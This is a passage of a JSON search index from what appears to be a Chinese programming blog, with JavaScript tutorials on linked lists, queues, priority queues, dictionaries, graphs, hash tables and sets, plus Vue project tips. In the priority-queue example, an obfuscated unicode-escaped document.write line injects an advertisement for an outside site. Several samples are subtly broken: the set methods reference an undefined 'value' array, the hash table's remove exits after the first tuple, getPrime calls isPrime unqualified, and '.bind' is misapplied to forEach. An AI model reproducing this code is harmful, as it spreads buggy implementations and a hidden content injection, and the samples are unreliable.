&#125;        // 获取第一个元素        DoublyLinkedList.prototype.getHead = function () &#123;            return this.head.element        &#125;        // 获取最后一个元素        DoublyLinkedList.prototype.getTail = function () &#123;            return this.tail.element        &#125;        // 遍历方法的实现        // 正向遍历的方法        DoublyLinkedList.prototype.forwardString = function () &#123;            var current = this.head            var forwardStr = &quot;&quot;            while (current) &#123;                forwardStr += &quot;,&quot; + current.element                current = current.next            &#125;            return forwardStr.slice(1)        &#125;        // 反向遍历的方法        DoublyLinkedList.prototype.reverseString = function () &#123;            var current = this.tail            var reverseStr = &quot;&quot;            while (current) &#123;                reverseStr += &quot;,&quot; + current.element                current = current.prev            &#125;            return reverseStr.slice(1)        &#125;        // 实现toString方法        DoublyLinkedList.prototype.toString = function () &#123;            return this.forwardString()        &#125;    &#125;\n\n双向链表的相关方法（增删改查）\nappend(element) 向链表尾部添加一个新的项\ninsert(position,element) 向链表的特定位置插入一个新的项\nget(position) 获取对应位置元素\nindexOf(element) 返回元素在链表中的索引，没有则返回-1\nupdate(position) 修改某个位置的元素\nremoveAt(position) 从链表的特定位置移除一项\nremove(element) 从链表中移除一项\nisEmpty() 判断链表是否为空\nsize() 链表中元素个数\ntoString() 将链表结构的内容以字符形式返回，重写js的toString方法\nforwardString() 返回正向遍历的节点字符串形式\nreverseString() 返回反向遍历的节点字符串形式\n\n","categories":["数据结构与算法"],"tags":["链表"]},{"title":"数据结构与算法（二）：队列","url":"/2022/03/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E9%98%9F%E5%88%97/","content":"js中队列的实现方式\n基于数组实现：队列基于数组元素性能不高\n基于链表实现\n\n队列的实现（基于数组）// 自定义队列function Queue() &#123;    var items = []    // 队列操作的方法    // enter queue方法    this.enqueue = function (element) &#123;        items.push(element)    &#125;    // delete queue方法    this.dequeue = function () &#123;        return items.shift()    &#125;    // 查看前端的元素    this.front = function () &#123;        return items[0]    &#125;    // 查看队列是否为空    this.isEmpty = function () &#123;        return items.length == 0    &#125;    // 查看队列中元素的个数    this.size = function () &#123;        return items.length    &#125;        //toString方法    this.toString = function() &#123;        var resultString = &#x27;&#x27;        for(var i=0;i&lt;this.items.length;i++)&#123;            resultString += this.items[i]+&#x27;&#x27;        &#125;        return resultString    &#125;&#125;// 创建队列对象var queue = new Queue()\n\n队列的相关方法（需自己实现）\nenqueue() 入队\ndequeue() 出队\nfront() 返回队列中第一个元素\nisEmpty() 判断队列是否为空\nsize() 队列中元素个数\ntoString() 将队列结构的内容以字符形式返回\n\n队列实现击鼓传花// 实现击鼓传花的函数function passGame(nameList, num) &#123;    // 1.创建一个队列, 并且将所有的人放在队列中    // 1.1.创建队列    var queue = new Queue()    // 1.2.通过for循环, 将nameList中的人放在队列中    for (var i = 0; i &lt; nameList.length; i++) &#123;        queue.enqueue(nameList[i])    &#125;    // 2.寻找最后剩下的人    while (queue.size() &gt; 1) &#123;        // 将前num-1中的人, 都从队列的前端取出放在队列的后端        for (var i = 0; i &lt; num-1; i++) &#123;            queue.enqueue(queue.dequeue())        &#125;        // 将第num个人, 从队列中移除        queue.dequeue()    &#125;    // 3.获取剩下的一个人    alert(queue.size())    var endName = queue.dequeue()    alert(&quot;最终留下来的人:&quot; + endName)    // 4.获取该人在队列中的位置    return nameList.indexOf(endName)&#125;// 验证结果var names = [&#x27;John&#x27;,&#x27;Jack&#x27;,&#x27;Camila&#x27;,&#x27;Ingrid&#x27;,&#x27;Carl&#x27;];var index = passGame(names, 7)alert(&quot;最终位置:&quot; + index)\n\n优先级队列\n优先级队列，在插入一个元素的时候会考虑该数据的优先级，和其它数据优先级进行比较，比较完成后，可以得出这个元素在。\n应用：计算机中线程处理的任务重要性不同\n\n// 封装优先级队列function PriorityQueue() &#123;    var items = []    // 内部类，封装一个新的构造函数, 用于保存元素和元素的优先级    function QueueElement(element, priority) &#123;        this.element = element        this.priority = priority    &#125;    // 添加元素的方法    this.enqueue = function (element, priority) &#123;        // 1.根据传入的元素, 创建新的QueueElement        var queueElement = new QueueElement(element, priority)        // 2.获取传入元素应该在正确的位置        if (this.isEmpty()) &#123;            items.push(queueElement)        &#125; else &#123;            var added = false            for (var i = 0; i &lt; items.length; i++) &#123;                // 注意: 我们这里是数字越小, 优先级越高                if (queueElement.priority &lt; items[i].priority) &#123;                    //第二个参数为0时，为插入函数                    items.splice(i, 0, queueElement)                    added = true                    break                &#125;            &#125;            // 遍历完所有的元素, 优先级都大于新插入的元素时, 就插入到最后            if (!added) &#123;                items.push(queueElement)            &#125;        &#125;    &#125;    // 删除元素的方法    this.dequeue = function () &#123;        return items.shift()    &#125;    // 获取前端的元素    this.front = function () &#123;        return items[0]    &#125;    // 查看元素是否为空    this.isEmpty = function () &#123;        return items.length == 0    &#125;    // 获取元素的个数    this.size = function () &#123;        return items.length    &#125;&#125;// 创建优先级队列对象var pQueue = new PriorityQueue()// 添加元素    pQueue.enqueue(&quot;abc&quot;, 10)    pQueue.enqueue(&quot;cba&quot;, 5)    pQueue.enqueue(&quot;nba&quot;, 12)    pQueue.enqueue(&quot;mba&quot;, 3)    document.write(&#x27;\\u66f4\\u591a\\u6559\\u7a0b\\u8bf7\\u8bbf\\u95ee\\u0020\\u0069\\u0074\\u006a\\u0063\\u0038\\u002e\\u0063\\u006f\\u006d&#x27;);    // 遍历所有的元素    var size = pQueue.size()    for (var i = 0; i &lt; size; i++) &#123;        var item = pQueue.dequeue()        alert(item.element + &quot;-&quot; + item.priority)    &#125;\n\n","categories":["数据结构与算法"],"tags":["队列"]},{"title":"数据结构与算法（五）：字典","url":"/2022/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E5%AD%97%E5%85%B8/","content":"\n字典中的ke不可以重复，value可以重复\nkey是无序的\nES6中包含了字典，可以直接使用\n\n字典的实现（基于对象）// 创建字典的构造函数function Dictionay() &#123;    // 字典属性    this.items = &#123;&#125;    // 字典操作方法    // 在字典中添加键值对    Dictionay.prototype.set = function (key, value) &#123;        this.items[key] = value    &#125;    // 判断字典中是否有某个key    Dictionay.prototype.has = function (key) &#123;        return this.items.hasOwnProperty(key)    &#125;    // 从字典中移除元素    Dictionay.prototype.remove = function (key) &#123;        // 1.判断字典中是否有这个key        if (!this.has(key)) return false        // 2.从字典中删除key        delete this.items[key]        return true    &#125;    // 根据key去获取value    Dictionay.prototype.get = function (key) &#123;        return this.has(key) ? this.items[key] : undefined    &#125;    // 获取所有的keys    Dictionay.prototype.keys = function () &#123;        return Object.keys(this.items)    &#125;    // 获取所有的value    Dictionay.prototype.values = function () &#123;        return Object.values(this.items)    &#125;    // size方法    Dictionay.prototype.size = function () &#123;        return this.keys().length    &#125;    // clear方法    Dictionay.prototype.clear = function () &#123;        this.items = &#123;&#125;    &#125;&#125;\n\n","categories":["数据结构与算法"],"tags":["字典"]},{"title":"数据结构与算法（八）：图论","url":"/2022/03/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E5%85%AB%EF%BC%89%EF%BC%9A%E5%9B%BE%E8%AE%BA/","content":"相关概念\n\n\n图的表示邻接矩阵\n二维数组\n邻接矩阵让每个节点和一个整数相关联，该整数作为数组的下标值\n\n\n\n优点：\n方便表示有向图、带权图\n\n\n缺点：\n如果图是一个稀疏图，则矩阵中会存在大量的0，浪费存储空间\n\n\n\n邻接表\n邻接表由图中每个顶点以及和顶点相邻的顶点列表组成\n这个列表有多种存储方式：数组、链表、字典（哈希表）等\n\n\n\n优点：\n计算出度简单\n\n\n缺点：\n计算入度麻烦，必须构造逆邻接表才能有效计算入度（开发中出度相对用的比较少）\n\n\n\n图的实现（基于邻接表）function Graph() &#123;    // 属性    this.vertexes = [] // 存储顶点    this.adjList = new Dictionay() // 存储边，字典由自己封装dict.js    // 添加方法    Graph.prototype.addVertex = function (v) &#123;        this.vertexes.push(v)        this.adjList.set(v, [])    &#125;    Graph.prototype.addEdge = function (v, w) &#123;        this.adjList.get(v).push(w)        this.adjList.get(w).push(v)    &#125;    Graph.prototype.toString = function () &#123;        var resultStr = &quot;&quot;        for (var i = 0; i &lt; this.vertexes.length; i++) &#123;            resultStr += this.vertexes[i] + &quot;-&gt;&quot;            var adj = this.adjList.get(this.vertexes[i])            for (var j = 0; j &lt; adj.length; j++) &#123;                resultStr += adj[j] + &quot; &quot;            &#125;            resultStr += &quot;\\n&quot;        &#125;        return resultStr    &#125;    // 初始化颜色    Graph.prototype.initializeColor = function () &#123;        var colors = []        for (var i = 0; i &lt; this.vertexes.length; i++) &#123;            colors[this.vertexes[i]] = &quot;white&quot;        &#125;        return colors    &#125;    // 广度优先算法    Graph.prototype.bfs = function (v, handler) &#123;        // 1.初始化颜色        var color = this.initializeColor()        // 2.创建队列        var queue = new Queue()   //队列由自己封装queue.js        // 3.将传入的顶点放入队列中        queue.enqueue(v)        // 4.从队列中依次取出和放入数据        while (!queue.isEmpty()) &#123;            // 4.1.从队列中取出数据            var qv = queue.dequeue()            // 4.2.获取qv相邻的所有顶点            var qAdj = this.adjList.get(qv)            // 4.3.将qv的颜色设置成灰色（为            color[qv] = &quot;gray&quot;            // 4.4.将qAdj的所有顶点依次压入队列中            for (var i = 0; i &lt; qAdj.length; i++) &#123;                var a = qAdj[i]                if (color[a] === &quot;white&quot;) &#123;                    color[a] = &quot;gray&quot;                    queue.enqueue(a)                &#125;            &#125;            // 4.5.因为qv已经探测完毕, 将qv设置成黑色            color[qv] = &quot;black&quot;            // 4.6.处理qv            if (handler) &#123;                handler(qv)            &#125;        &#125;    &#125;    // 深度优先搜索    Graph.prototype.dfs = function (handler) &#123;        // 1.初始化颜色        var color = this.initializeColor()        // 2.遍历所有的顶点, 开始访问        for (var i = 0; i &lt; this.vertexes.length; i++) &#123;            if (color[this.vertexes[i]] === &quot;white&quot;) &#123;                this.dfsVisit(this.vertexes[i], color, handler)            &#125;        &#125;    &#125;    // dfs的递归调用方法    Graph.prototype.dfsVisit = function (u, color, handler) &#123;        // 1.将u的颜色设置为灰色        color[u] = &quot;gray&quot;        // 2.处理u顶点        if (handler) &#123;            handler(u)        &#125;        // 3.u的所有邻接顶点的访问        var uAdj = this.adjList.get(u)        for (var i = 0; i &lt; uAdj.length; i++) &#123;            var w = uAdj[i]            if (color[w] === &quot;white&quot;) &#123;                this.dfsVisit(w, color, handler)            &#125;        &#125;        // 4.将u设置为黑色        color[u] = &quot;black&quot;    &#125;&#125;\n\n图的遍历\n广度优先搜索（BFS,Breadth-First Search)\n基于队列：入队列的顶点先被搜索\n从指定的第一个顶点开始遍历图，先访问其所有的相邻点，就像一次访问图的一层（类似树中的层序遍历）\n\n\nBFS的实现\n深度优先搜索（DFS,Depth-First Search)\n基于栈或使用递归：通过将顶点存入栈中，顶点是沿着路径被探索的，存在新的相邻顶点就去访问\n从第一个指定的顶点开始遍历图，沿着路径直到这条路径最后被访问完毕，接着原路回退并探索下一条路径（类似树中的先序遍历）\n\nDFS的实现\n","categories":["数据结构与算法"],"tags":["图"]},{"title":"数据结构与算法（六）：哈希表","url":"/2022/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E5%93%88%E5%B8%8C%E8%A1%A8/","content":"\n数组进行插入、删除、修改操作，效率较低\n数组查找操作：\n\n基于索引查找，效率高\n基于内容查找，效率低\n\n哈希表是基于数组实现的，但是它相对于数组有很多优势：\n\n非常快速插入、删除、查找\n速度比树还要快，瞬间查找\n相对于树来说更容易编码\n\n哈希表缺点：\n\n数据无序，不能以固定方式（比如从小到大）来遍历其中的元素\nkey不允许重复\n\n哈希表的结构是数组，它通过哈希函数对下标值进行变换，通过哈希函数可以获取HashCode\n\n相关概念哈希化将大数字转化成数组范围内下标的过程（如取余），称为哈希化\n哈希函数通常我们会将单词（key）转成大数字，大数字在进行哈希化的代码实现放在一个函数中，这个函数称为哈希函数\n哈希表最终将数据插入到的这个数组，对整个结构的封装，称之为一个哈希表\n装填因子（loadFactor）表示当前哈希表中已经包含的数据项和整个哈希表长度的比值\n装填因子&#x3D;总数据项&#x2F;哈希表长度\n哈希表的冲突\n两个大数字哈希化后得到的下标相同，称为冲突，冲突不可避免\n\n解决冲突\n链地址法（拉链法）\n\n每个数组单元中存储的不再是单个数据，而是一个链条（数组或链表）\n比如是链表，一旦发现重复，则将重复的元素插入到链表的首端或末端即可\n查询时，根据哈希化后的下标值找到对应的位置，再取出链表，依次查询找寻找的数据\n数组or链表？\n效率上差不多，因为在对应位置查找时，使用线性查找\n在某些实现中，会将新插入的数据放在链条的最前面，因为认为新插入的数据用于取出的可能性更大，这个时候最好采用链表（插入效率高）\n根据业务需求选择数据结构，不见得新数据访问次数会更多：比如微信新添加的好友没有老朋友联系频繁\n\n\n\n\n开放地址法\n\n寻找空白的位置来放置冲突的数据项，探测这个位置有三种方法：\n\n线性探测\n线性查找空白的单元\n插入：从index位置+1开始一点点找合适的位置（空的位置就是合适的位置）\n查找：与插入相似，注意如果查找的元素之前没有插入哈希表，不需要查询整个表，而是查询到空位置就停止\n删除：与插入相似，注意删除一个数据项时，不可以将这个位置的内容设置为空null，因为如果设置为null可能会影响之后查找其它数据，因此通常将它进行特殊处理（比如设置为-1）。当之后看到-1的数据项时，就知道查询时要继续查询，但插入的时候这个位置可以放置数据。\n问题：聚集会影响性能\n\n二次探测\n在线性探测的基础上进行优化，优化探测时的步长\n比如从下标值x开始，$$x+1^2,x+2^2,x+3^2$$,这样可以一次探测较长的距离，避免聚集带来的影响\n问题：连续插入的是哈希化后相同的数据想，造成步长不一的一种聚集\n\n再哈希法\n依赖于关键字的探测序列，不同关键字即使映射到相同的数组下标，也可以使用不同的探测序列\n第二次哈希化：把关键字用另外一个哈希函数在做一次哈希化，用这次哈希化的结果作为步长\n对于指定关键字，步长在整个探测中是不变的，不过不同关键字使用不同的步长\n\n第二次哈希化的特点：与第一个哈希函数不同，且不能输出为0\nstepSize &#x3D; constant - （key % constant）\n其中constant是质数，且小于数组的容量\n\n\n\n\n\n\n\n\n哈希化的效率\n如果没有产生冲突，那么效率会更高\n\n如果发生冲突，存取时间就依赖后来的探测长度\n\n平均探测长度及平均存取时间，取决于填装因子，随着填装因子变大，探测长度也越来越长\n装填因子&#x3D;总数据项&#x2F;哈希表长度\n开放地址法装填因子：最大是1，因为它必须找到空白的单元才能将元素放入\n链地址法的装填因子：可以大于1，因为它可以无限的延伸下去\n\n\n线性探测的性能\n\n\n二次探测和再哈希法的性能\n\n\n\n\n链地址法的性能\n\n\n真实开发中，使用链地址法的情况较多\n\n因为它不会因为添加了某元素后性能急剧下降\n比如在Java中的HashMap中使用的就是链地址法\n\n\n\n哈希函数好的哈希函数应该具备的特点\n快速的计算\n哈希函数中尽量少有乘法和除法，因为它们性能较低\n\n均匀的分布\n\n\n快速计算：霍纳法则\n均匀分布\n\n再哈希表中的质数很重要\n链地址法中的质数不重要\n\n哈希函数的实现//设计哈希函数//1&gt; 将字符串转成比较大的数字：hashCode//2&gt; 将大的数字hashCode压缩到数组范围（大小）之内function hashFunc(str, size) &#123;    // 1.初始化hashCode的值    var hashCode = 0    // 2.霍纳算法, 来计算hashCode的数值    for (var i = 0; i &lt; str.length; i++) &#123;        //charCodeAt()可以获取Unicode编码，质数常用37        hashCode = 37 * hashCode + str.charCodeAt(i)    &#125;    // 3.取模运算    hashCode = hashCode % size    return hashCode&#125;alert(hashFunc(&quot;abc&quot;, 7)) // 4    alert(hashFunc(&quot;cba&quot;, 7)) // 3    alert(hashFunc(&quot;nba&quot;, 7)) // 5    alert(hashFunc(&quot;mba&quot;, 7)) // 1\n\n哈希表的实现（链地址法）// 创建HashTable构造函数function HashTable() &#123;    // 定义属性    this.storage = []    this.count = 0   //记录数组里已经存放的元素数    this.limit = 8   //数组的长度    // 定义相关方法    // 判断是否是质数    HashTable.prototype.isPrime = function (num) &#123;        var temp = parseInt(Math.sqrt(num))        // 2.循环判断        for (var i = 2; i &lt;= temp; i++) &#123;            if (num % i == 0) &#123;                return false            &#125;        &#125;        return true    &#125;    // 获取质数    HashTable.prototype.getPrime = function (num) &#123;        while (!isPrime(num)) &#123;            num++        &#125;        return num    &#125;    // 哈希函数    HashTable.prototype.hashFunc = function(str, max) &#123;        // 1.初始化hashCode的值        var hashCode = 0        // 2.霍纳算法, 来计算hashCode的数值        for (var i = 0; i &lt; str.length; i++) &#123;            hashCode = 37 * hashCode + str.charCodeAt(i)        &#125;        // 3.取模运算        hashCode = hashCode % max        return hashCode    &#125;    // 插入&amp;修改数据方法    HashTable.prototype.put = function (key, value) &#123;        // 1.获取key对应的index        var index = this.hashFunc(key, this.limit)        // 2.取出数组(也可以使用链表)        // 数组中放置数据的方式: [[ [k,v], [k,v], [k,v] ] , [ [k,v], [k,v] ]  [ [k,v] ] ]        var bucket = this.storage[index]        // 3.判断这个数组是否存在        if (bucket === undefined) &#123;            // 3.1创建桶            bucket = []            this.storage[index] = bucket        &#125;        // 4.判断是新增还是修改原来的值.        var override = false        for (var i = 0; i &lt; bucket.length; i++) &#123;            var tuple = bucket[i]    //tuple = [k,v]            if (tuple[0] === key) &#123;                tuple[1] = value                override = true            &#125;        &#125;        // 5.如果是新增, 前一步没有覆盖        if (!override) &#123;            bucket.push([key, value])            this.count++            if (this.count &gt; this.limit * 0.75) &#123;                var primeNum = this.getPrime(this.limit * 2)                this.resize(primeNum)            &#125;        &#125;    &#125;    // 获取存放的数据    HashTable.prototype.get = function (key) &#123;        // 1.获取key对应的index        var index = this.hashFunc(key, this.limit)        // 2.获取对应的bucket        var bucket = this.storage[index]        // 3.如果bucket为null, 那么说明这个位置没有数据        if (bucket == null) &#123;            return null        &#125;        // 4.有bucket, 判断是否有对应的key  线性查找        for (var i = 0; i &lt; bucket.length; i++) &#123;            var tuple = bucket[i]            if (tuple[0] === key) &#123;                return tuple[1]            &#125;        &#125;        // 5.没有找到, return null        return null    &#125;    // 删除数据    HashTable.prototype.remove = function (key) &#123;        // 1.获取key对应的index        var index = this.hashFunc(key, this.limit)        // 2.获取对应的bucket        var bucket = this.storage[index]        // 3.判断同是否为null, 为null则说明没有对应的数据        if (bucket == null) &#123;            return null        &#125;        // 4.遍历bucket, 寻找对应的数据        for (var i = 0; i &lt; bucket.length; i++) &#123;            var tuple = bucket[i]            if (tuple[0] === key) &#123;                //从下标值为i的地方删除1个元素                bucket.splice(i, 1)                this.count--                // 缩小数组的容量                if (this.limit &gt; 7 &amp;&amp; this.count &lt; this.limit * 0.25) &#123;                    var primeNum = this.getPrime(Math.floor(this.limit / 2))                    this.resize(primeNum)                &#125;            &#125;            return tuple[1]        &#125;        // 5.来到该位置, 说明没有对应的数据, 那么返回null        return null    &#125;    // isEmpty方法    HashTable.prototype.isEmpty = function () &#123;        return this.count == 0    &#125;    // size方法    HashTable.prototype.size = function () &#123;        return this.count    &#125;    // 哈希表扩容    HashTable.prototype.resize = function (newLimit) &#123;        // 1.保存旧的数组内容        var oldStorage = this.storage        // 2.重置属性        this.limit = newLimit        this.count = 0        this.storage = []        // 3.遍历旧数组中的所有数据项, 并且重新插入到哈希表中        oldStorage.forEach(function (bucket) &#123;            // 1.bucket为null, 说明这里面没有数据            if (bucket == null) &#123;                return            &#125;            // 2.bucket中有数据, 那么将里面的数据重新哈希化插入            for (var i = 0; i &lt; bucket.length; i++) &#123;                var tuple = bucket[i]                this.put(tuple[0], tuple[1])            &#125;        &#125;).bind(this)    &#125;&#125;\n\n哈希表的扩容思想\n链地址法的装填因子可以大于1，可以无限制的插入新数据\n但随着数据量的增多，每个index对于的bucket会越来越长，造成效率的降低\n因此需要在合适的情况对数组进行扩容\n扩容时所有的数据项一定要同时进行修改（重新调用哈希函数，来获取到不同的位置）\n\n\n什么情况下进行扩容？\n常见情况是loadFactor &gt; 0.75时，进行扩容\n比如java的哈希表就是再装填因子大于0.75时进行扩容的\n缩容：loadFactor &lt; 0.25\n\n\n// 哈希表扩容HashTable.prototype.resize = function (newLimit) &#123;    // 1.保存旧的数组内容    var oldStorage = this.storage    // 2.重置属性    this.limit = newLimit    this.count = 0    this.storage = []    // 3.遍历旧数组中的所有数据项, 并且重新插入到哈希表中    oldStorage.forEach(function (bucket) &#123;        // 1.bucket为null, 说明这里面没有数据        if (bucket == null) &#123;            return        &#125;        // 2.bucket中有数据, 那么将里面的数据重新哈希化插入        for (var i = 0; i &lt; bucket.length; i++) &#123;            var tuple = bucket[i]            this.put(tuple[0], tuple[1])        &#125;    &#125;).bind(this)&#125;\n\n","categories":["数据结构与算法"],"tags":["哈希表"]},{"title":"数据结构与算法（十）：动态规划","url":"/2022/05/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E5%8D%81%EF%BC%89%EF%BC%9A%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","content":"链接：https://leetcode-cn.com/problems/maximum-subarray/solution/dai-ma-sui-xiang-lu-53-zui-da-zi-xu-he-b-xqus/来源：力扣（LeetCode）\n\n","categories":["数据结构与算法"],"tags":["动态规划"]},{"title":"数据结构与算法（四）：集合","url":"/2022/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E9%9B%86%E5%90%88/","content":"\n无序、不重复\n不能通过下标值访问元素\nES6中包含了Array类和Set类，可以直接使用\n但为了学习其内部机制，这里自己封装\n\n集合的实现（基于对象） // 封装集合的构造函数function Set() &#123;    // 使用一个对象来保存集合的元素    this.items = &#123;&#125;    // 集合的操作方法    // 判断集合中是否有某个元素    Set.prototype.has = function (value) &#123;        return this.items.hasOwnProperty(value)    &#125;    // 向集合中添加元素    Set.prototype.add = function (value) &#123;        // 1.判断集合中是否已经包含了该元素        if (this.has(value)) return false        // 2.将元素添加到集合中(键值都为value)        this.items[value] = value        return true    &#125;    // 从集合中删除某个元素    Set.prototype.remove = function (value) &#123;        // 1.判断集合中是否包含该元素        if (!this.has(value)) return false        // 2.包含该元素, 那么将元素删除        delete this.items[value]        return true    &#125;    // 清空集合中所有的元素    Set.prototype.clear = function () &#123;        this.items = &#123;&#125;    &#125;    // 获取集合的大小    Set.prototype.size = function () &#123;        return Object.keys(this.items).length        /*            考虑兼容性问题, 使用下面的代码            var count = 0            for (var value in this.items) &#123;                if (this.items.hasOwnProperty(value)) &#123;                    count++                &#125;            &#125;            return count            */    &#125;    // 获取集合中所有的值    Set.prototype.values = function () &#123;        return Object.keys(this.items)        /*            考虑兼容性问题, 使用下面的代码            var keys = []            for (var value in this.items) &#123;                keys.push(value)            &#125;            return keys            */    &#125;        //集合间的操作    //并集    Set.prototype.union = function (otherSet)&#123;        var unionSet = new Set()                var values = this.values()        for(var i = 0;i&lt;values.length;i++)&#123;            unionSet.add(values[i])        &#125;                values = otherSet.values()        for(var i = 0;i&lt;values.length;i++)&#123;            unionSet.add(values[i])        &#125;                return unionSet    &#125;    //交集    Set.prototype.intersection = function (otherSet)&#123;        var intersectionSet = new Set()                var values = this.values()        for(var i = 0;i&lt;values.length;i++)&#123;            var item = value[i]            if(otherSet.has(item))&#123;                intersectionSet.add(item)            &#125;        &#125;        return intersectionSet    &#125;    //差集    Set.prototype.difference = function (otherSet)&#123;        var differenceSet = new Set()                var values = this.values()        for(var i = 0;i&lt;values.length;i++)&#123;            var item = value[i]            if(!otherSet.has(item))&#123;                differenceSet.add(item)            &#125;        &#125;        return differenceSet    &#125;    //子集    Set.prototype.subset = function (otherSet)&#123;        var values = this.values()        for(var i = 0;i&lt;values.length;i++)&#123;            var item = value[i]            if(!otherSet.has(item))&#123;                return false            &#125;        &#125;        return true    &#125;&#125;\n\n集合的相关方法（增删改查）\nadd(value) \nremove(value)\nhas(value)\nclear()\nsize()\nvalue()\n集合间的操作\n并集 union\n交集 intersection\n差集 difference\n子集 subset\n\n\n\n","categories":["数据结构与算法"],"tags":["集合"]},{"url":"/2022/05/05/%E9%9D%A2%E8%AF%95%E9%A2%98%E9%9B%86%E5%90%88/","content":""},{"title":"项目搭建（一）：学业分析系统优化","url":"/2022/05/02/%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%AD%A6%E4%B8%9A%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/","content":"\n该项目原来没有用模块化，使用bootstrap框架，代码\n\n\n优化前：没有使用模块化，使用bootstrap框架，代码耦合度高\n优化后：使用vue+elementUi框架\n\n后端问题大量数据查询缓慢问题\n解决：数据库分页\n\n前端问题跨域问题使用代理服务器\nVue（二十四）：Vue脚手架之配置代理\n父子组件通信问题：父组件传值给子组件虽然最后页面可以正常显示。传过来的数据也在，但是会报:”TypeError: Cannot read property ‘xxx’ of undefined”\n原因：父组件传值给子组件但是页面已经开始渲染里但是数据还没传过来\n解决方案：加一个判断如果传给子组件的值还没过来的话先不去加载————————————————原文链接：https://blog.csdn.net/peepeeman/article/details/107387949\nvue父组件异步传递prop到子组件echarts画图问题踩坑总结 - 古兰精 - 博客园 (cnblogs.com)\n4、考虑到父组件传递prop就是渲染时传递。\n　　那么我就可以给子组件加个判断 v-if 条件，当父组件从后台异步取到数据后，并且赋值给prop后，让flag &#x3D; true再去渲染子组件，那么此时传递给子组件的prop就是异步获取到数据之后的值，图形就正常展示出来了。\nElement-UI table的高度动态自适应(16条消息) Element-UI table的高度动态自适应 !_Masics丶的博客-CSDN博客_element table 动态高度\n","categories":["项目"],"tags":["项目"]},{"title":"项目搭建相关Tips","url":"/2022/03/05/%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA%E7%9B%B8%E5%85%B3Tips/","content":"CSS文件分类\nindex.css：当前页面样式\n\nreset.css：重置样式\n\nbase.css：公共样式\n.clearfix::before,.clearfix::after&#123;    content:&#x27;&#x27;;    display:table;    clear:both;&#125;body&#123;    font:...;    color:#333;    /*保证浏览器缩小时，中间容器布局不混乱*/    min-width:1226px;&#125;/*中间容器*/.w&#123;    width:1226px;    margin:0 auto;&#125;\n\n生成小三角（利用边框）\n创建一个大小为0的盒子，只保留一边的边框颜色，其余边全设置为透明。\n示例：\n\n.box1&#123;\twidth:0px;    height:0px;    border:10px red solid;    border-top:none;    border-color:trasparent trasparent blue trasparent;&#125;\n\n\n效果：\n\n\n\n网站发布时的压缩\n加载时速度变快\n\n将css和js中的注释、空行去除：\nindex.css -&gt; index.min.css\n工具：\n\nJS &amp; CSS Minifier\n\n\n\n","categories":["项目"],"tags":["CSS","HTML","实战演练"]},{"title":"项目搭建（二）:lofty-admin项目重构","url":"/2022/06/07/%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9Alofty-admin%E9%A1%B9%E7%9B%AE%E9%87%8D%E6%9E%84/","content":"\n将lofty-w-admin项目中的agentlist和officelist重构到agent-insights-front项目中\n\n问题及解决方案路由跳转导航栏消失的问题使用路由跳转的时候，点击导航栏的菜单项，是跳转了，可是页面直接跳转了，导航栏不见了，想要保持导航栏待在原地不动（element-ui）\n解决办法：配置路由的时候要使用父子路由\n&#123;     path: &#x27;/manage&#x27;,     component: Manage,     name: &#x27;&#x27;,     children: [       //  用户管理       &#123;       path: &#x27;/newNum&#x27;,       component: newNum,       meta: [&#x27;数据管理&#x27;, &#x27;用户列表&#x27;],       &#125;,]\n","categories":["项目"],"tags":["项目"]}]